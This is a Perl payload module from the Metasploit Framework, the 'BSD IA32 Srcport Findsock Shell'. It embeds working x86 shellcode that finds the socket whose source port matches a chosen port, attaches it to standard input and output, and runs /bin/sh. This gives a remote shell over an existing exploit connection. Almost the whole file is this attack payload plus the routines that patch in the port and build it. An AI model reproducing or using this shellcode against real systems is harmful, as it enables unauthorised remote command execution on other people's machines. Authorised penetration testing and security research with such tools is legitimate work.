
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::bsd_ia32_findsock;
use strict;
use base 'Msf::PayloadComponent::FindConnection';

my $info =
{
  'Name'         => 'BSD IA32 Srcport Findsock Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Spawn a shell on the established connection',
  'Authors'      => [ 'vlad902 <vlad902 [at] gmail.com>', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'bsd' ],
  'Size'         => '',
  'UserOpts'     =>
    {
      'CPORT' => [1, 'PORT', 'Local port used by exploit'],
    }
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('CPORT')));
}

sub Generate {
  my $self = shift;
  my $port = shift;
  my $off_port = 24;
  my $port_bin = pack('n', $port);

  my $shellcode = # bsd findsock code by vlad902 
  "\x31\xff\x57\x89\xe5\x47\x89\xec\x6a\x10\x54\x55".
  "\x57\x6a\x1f\x58\x6a\x02\xcd\x80\x66\x81\x7d\x02".
  "\x11\x5c\x75\xe9\x59\x51\x57\x6a\x5a\x58\x51\xcd".
  "\x80\x49\x79\xf5\x68\x2f\x2f\x73\x68\x68\x2f\x62".
  "\x69\x6e\x89\xe3\x50\x54\x53\xb0\x3b\x50\xcd\x80";


  substr($shellcode, $off_port, 2, $port_bin);

  return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('4444');
  return(length($bin));
}

1;
